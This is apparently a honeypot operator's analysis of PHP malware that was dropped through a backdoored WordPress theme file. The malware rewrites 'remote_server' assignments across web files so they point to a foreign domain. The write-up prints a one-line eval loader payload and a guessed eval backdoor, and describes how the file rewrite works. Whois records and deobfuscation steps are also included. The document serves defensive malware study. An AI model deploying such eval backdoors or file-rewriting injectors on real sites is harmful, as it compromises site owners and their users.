# Edit ASP, PHP, JSP, ASPX files

This code seems to recursively find all files with
names with suffixes "asp", "php", "jsp", "aspx",
and edit them.

All instances of `remote_server = something`
get changed to `Remote-server"www.guanjianfalan.com"`.
I think this would ruin almost all web apps that assign
a DNS name to a variable named 'remote_server'.
Maybe www.guanjianfalan.com would get a few extra hits.

## Origin

### Download

Downloaded to my WordPress honey pot by invoking a URL
ending in "/wp-content/themes/twentytwelve/404.php",
which seems to be known in the script-kiddie underground
as some kind of back door.
Usually, "/wp-content/themes/twentytwelve/404.php" get invoked
with WSO web shell HTTP parameters,
but this invocation arrived with parameters named
`@123`, `x1` through `x4`, `z0` and `z9`.

The `@123` parameter had a value that amounted to:

    @eval(${'_POST'}[z9](${'_POST'}[z0]));

The `z0` parameter held most of the download's source,
but `z9` had the value "BaSE64_dEcOdE".
The backdoor (unknown to me) almost certainly did something like

    <?php @eval($_POST['@123']); ?>

I don't understand the extra level of "eval" in `@123`.

### IP Address 119.103.188.94

119.103.188.94 has no reverse lookup.

`whois` says this:

    inetnum:        119.96.0.0 - 119.103.255.255
    netname:        CHINANET-HB
    descr:          CHINANET Hubei province network
    descr:          Data Communication Division
    descr:          China Telecom
    country:        CN
    irt:            IRT-CHINANET-CN
    address:        No.31 ,jingrong street,beijing
    address:        100032

## Deobfuscation

I had to iteratively run my [php malware deobfuscator](https://github.com/bediger/reverse-php-malware)
on the original, obfuscated, source code.
The original code arrived in a set of seven HTTP parameters.
It was not immediately obvious how the values of the seven parameters
interacted to produce cleartext.

1. `dc1.php` &rarr; deobfuscator &rarr; `f1.php`
2. hand edit `f1.php` &rarr; pretty-printer &rarr; `f2.php`
3. hand edit `f2.php` &rarr; deobfuscator &rarr; `f3.php`
4. hand edit `f3.php` &rarr; deobfuscator &rarr; `f4.php`

Calls to PHP builtin `base64_decode()` nested inside calls
to `preg_replace()` and other builtins meant that my deobfuscator
didn't evaluate those calls to `base64_decode()`.
I did just enough decomposition to get my deobfuscator to
do its work.

## Analysis

Through recursive calls to `function BL()`, the code finds all files
that reside under whatever PHP decides is DOCUMENT_ROOT.
The files have to have a name with a suffix matching reqular expression "asp|php|jsp|aspx",
and be less than 30 Kb in size.
Code in `function BL()` seems clean and professional.
It checks for errors.
It closes open handles.
It accounts for directories named "." and "..".

`function BL()` calls `BL()` on any directories other than "." and ".." it finds,
and calls `function RP()` on files meeting its regular expression and size criteria.
`RP()` reads a file's contents, and looks for text matching a regular expression
`remote_server *= *[\\\'|\\"]*\\S+[\\\'|\\"]`. That's probably all assignments
to a variable named "remote_server" of any single- or double-quoted string.
`RP()` changes that assignment to `'Remote_server = "www.guanjianfalan.com"`.
If more than zero changes occurred, it increments a global count of such changes.
Between carefully setting file permissions to allow reads and writes,
the workmanlike regular expression, and only counting files it successfully
modified and wrote back, this is also a well-written function.

The code actually reports how many files it modified to the invoker,
in an easily-parseable format.
For example, if it had modified 9 files, it would report `->|9|<-'.

### guanjianfalan.com

The obvious question is why direct everything to www.guanjianfalan.com?
What does www.guanjianfalan.com offer?
I was not able to answer this question.

www.guanjianfalan.com has a DNA A record for 27.155.88.190

27.155.88.190 has this `whois` info:

    inetnum:        27.152.0.0 - 27.159.255.255
    netname:        CHINANET-FJ
    descr:          CHINANET FUJIAN PROVINCE NETWORK
    descr:          China Telecom
    descr:          No.31,jingrong street
    descr:          Beijing 100032
    country:        CN

`whois` guanjianfalan.com says this:

    Domain Name: GUANJIANFALAN.COM
    Registry Domain ID: 2053343181_DOMAIN_COM-VRSN
    Registrar WHOIS Server: grs-whois.hichina.com
    Registrar URL: http://www.net.cn
    Updated Date: 2018-10-29T07:34:48Z
    Creation Date: 2016-08-18T18:19:04Z
    Registry Expiry Date: 2019-08-18T18:19:04Z
    Registrar: Alibaba Cloud Computing (Beijing) Co., Ltd.
    Registrar IANA ID: 420

I have no idea what this web server has to offer.
The contents my web browser retrieved did not render well,
and appear to be in Chinese.
